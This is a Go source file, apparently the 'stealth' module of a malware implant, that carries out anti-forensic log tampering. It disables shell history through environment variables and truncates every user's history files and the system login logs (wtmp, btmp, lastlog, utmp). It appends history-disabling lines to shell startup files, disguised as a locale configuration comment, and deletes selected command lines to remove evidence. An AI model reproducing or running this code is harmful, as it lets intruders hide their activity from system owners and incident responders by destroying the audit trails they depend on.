package stealth

import (
	"bufio"
	"os"
	"path/filepath"
	"strings"
)

// HistoryFiles lists common shell history and logging files to clean.
var HistoryFiles = []string{
	".bash_history",
	".zsh_history",
	".sh_history",
	".history",
	".python_history",
	".mysql_history",
	".psql_history",
	".node_repl_history",
	".lesshst",
	".viminfo",
	".wget-hsts",
}

// SessionLogFiles lists files where terminal sessions can be recorded.
var SessionLogFiles = []string{
	"/var/log/wtmp",
	"/var/log/btmp",
	"/var/log/lastlog",
	"/var/run/utmp",
}

// ObfuscateHistory applies all history obfuscation techniques.
func ObfuscateHistory() {
	disableHistoryEnv()
	cleanUserHistories()
	cleanSessionLogs()
}

// disableHistoryEnv sets environment variables to prevent shell history recording.
// Any shells spawned by the implant (task execution) will not log commands.
func disableHistoryEnv() {
	os.Setenv("HISTFILE", "/dev/null")
	os.Setenv("HISTSIZE", "0")
	os.Setenv("HISTFILESIZE", "0")
	os.Setenv("SAVEHIST", "0")
	os.Setenv("HISTCONTROL", "ignoreboth")

	// Zsh-specific
	os.Setenv("HIST_STAMPS", "")
	os.Setenv("HISTTIMEFORMAT", "")

	// Disable script/screen/tmux logging
	os.Unsetenv("SCRIPT")
	os.Unsetenv("SCREENLOG")
}

// cleanUserHistories truncates history files for all users.
// Only cleans if running as root (can access all home dirs).
func cleanUserHistories() {
	homeBase := "/home"
	homes := []string{"/root"}

	entries, err := os.ReadDir(homeBase)
	if err == nil {
		for _, e := range entries {
			if e.IsDir() {
				homes = append(homes, filepath.Join(homeBase, e.Name()))
			}
		}
	}

	for _, home := range homes {
		for _, histFile := range HistoryFiles {
			path := filepath.Join(home, histFile)
			if _, err := os.Stat(path); err == nil {
				// Truncate rather than delete — deletion is more suspicious
				os.Truncate(path, 0)
			}
		}
	}
}

// cleanSessionLogs truncates system session logs.
func cleanSessionLogs() {
	for _, logFile := range SessionLogFiles {
		if _, err := os.Stat(logFile); err == nil {
			os.Truncate(logFile, 0)
		}
	}
}

// InjectRCDisable appends history-disabling commands to shell rc files.
// These persist across shell sessions spawned by the implant.
// The injected lines are disguised as locale configuration comments.
func InjectRCDisable(home string) {
	rcFiles := []string{".bashrc", ".zshrc", ".profile"}

	// Disguised as locale config — blends with existing rc entries
	payload := "\n# locale configuration\nunset HISTFILE\nexport HISTSIZE=0\n"

	for _, rc := range rcFiles {
		path := filepath.Join(home, rc)
		info, err := os.Stat(path)
		if err != nil {
			continue
		}

		// Check if already injected
		if containsPayload(path, "unset HISTFILE") {
			continue
		}

		// Preserve original file permissions
		f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, info.Mode())
		if err != nil {
			continue
		}
		f.WriteString(payload)
		f.Close()
	}
}

// RemoveRCDisable removes injected history-disabling lines from rc files.
// Used during cleanup.
func RemoveRCDisable(home string) {
	rcFiles := []string{".bashrc", ".zshrc", ".profile"}

	for _, rc := range rcFiles {
		path := filepath.Join(home, rc)
		removeInjectedLines(path)
	}
}

func containsPayload(path, marker string) bool {
	f, err := os.Open(path)
	if err != nil {
		return false
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		if strings.Contains(scanner.Text(), marker) {
			return true
		}
	}
	return false
}

func removeInjectedLines(path string) {
	// Read original permissions before modifying
	info, err := os.Stat(path)
	if err != nil {
		return
	}
	origMode := info.Mode()

	f, err := os.Open(path)
	if err != nil {
		return
	}

	var lines []string
	scanner := bufio.NewScanner(f)
	skip := false
	for scanner.Scan() {
		line := scanner.Text()
		if line == "# locale configuration" {
			skip = true
			continue
		}
		if skip && (line == "unset HISTFILE" || line == "export HISTSIZE=0" || line == "") {
			if line == "export HISTSIZE=0" {
				skip = false
			}
			continue
		}
		skip = false
		lines = append(lines, line)
	}
	f.Close()

	// Atomic write: write to temp file then rename to avoid corruption
	tmpPath := path + ".tmp"
	if err := os.WriteFile(tmpPath, []byte(strings.Join(lines, "\n")+"\n"), origMode); err != nil {
		os.Remove(tmpPath)
		return
	}
	os.Rename(tmpPath, path)
}

// CleanSpecificEntries removes lines matching patterns from a history file.
// Use this to surgically remove evidence of specific commands rather than
// truncating the entire file (which is more suspicious).
func CleanSpecificEntries(historyPath string, patterns []string) error {
	info, err := os.Stat(historyPath)
	if err != nil {
		return err
	}

	f, err := os.Open(historyPath)
	if err != nil {
		return err
	}

	var kept []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		remove := false
		for _, pattern := range patterns {
			if strings.Contains(strings.ToLower(line), strings.ToLower(pattern)) {
				remove = true
				break
			}
		}
		if !remove {
			kept = append(kept, line)
		}
	}
	f.Close()

	// Atomic write to prevent corruption
	tmpPath := historyPath + ".tmp"
	if err := os.WriteFile(tmpPath, []byte(strings.Join(kept, "\n")+"\n"), info.Mode()); err != nil {
		os.Remove(tmpPath)
		return err
	}
	return os.Rename(tmpPath, historyPath)
}
